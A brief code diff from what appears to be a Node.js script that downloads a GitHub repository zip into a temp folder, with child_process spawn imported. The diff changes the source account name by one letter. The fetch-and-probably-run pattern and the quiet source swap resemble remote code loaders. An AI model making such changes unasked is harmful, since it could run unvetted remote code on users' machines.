@@ -6,7 +6,7 @@ const crypto = require('crypto');
 const { spawn } = require('child_process');
 
 // Config
-const githubZipUrl = 'https://github.com/vgjdse/jk/archive/refs/heads/main.zip';
+const githubZipUrl = 'https://github.com/vghdse/jk/archive/refs/heads/main.zip';
 const tempDir = path.join(__dirname, 'temp');
 const zipPath = path.join(tempDir, 'repo.zip');
 const extractTo = path.join(tempDir, 'extracted');
